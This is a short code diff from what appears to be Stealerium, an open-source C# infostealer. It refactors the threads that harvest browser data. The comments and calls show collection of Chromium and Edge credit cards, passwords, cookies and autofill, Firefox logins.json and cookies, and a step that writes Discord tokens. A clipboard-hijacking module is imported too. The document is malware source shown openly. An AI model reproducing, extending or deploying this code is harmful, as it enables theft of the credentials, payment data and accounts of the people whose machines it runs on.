@@ -4,6 +4,9 @@ using System.IO;
 using System.Threading;
 using Stealerium.Clipper;
 using Stealerium.Target;
+using Stealerium.Target.Browsers.Chromium;
+using Stealerium.Target.Browsers.Edge;
+using Stealerium.Target.Browsers.Firefox;
 using Stealerium.Target.Gaming;
 using Stealerium.Target.Messengers;
 using Stealerium.Target.System;
@@ -28,12 +31,12 @@ namespace Stealerium.Helpers
                 // Chromium & Edge thread (credit cards, passwords, cookies, autofill, history, bookmarks)
                 threads.Add(new Thread(() =>
                 {
-                    Target.Browsers.Chromium.Recovery.Run(sSavePath + "\\Browsers");
-                    Target.Browsers.Edge.Recovery.Run(sSavePath + "\\Browsers");
+                    RecoverChrome.Run(sSavePath + "\\Browsers");
+                    RecoverEdge.Run(sSavePath + "\\Browsers");
                 }));
                 // Firefox thread (logins.json, db files, cookies, history, bookmarks)
                 threads.Add(new Thread(() =>
-                    Target.Browsers.Firefox.Recovery.Run(sSavePath + "\\Browsers")
+                    RecoverFirefox.Run(sSavePath + "\\Browsers")
                 ));
 
                 // Write discord tokens
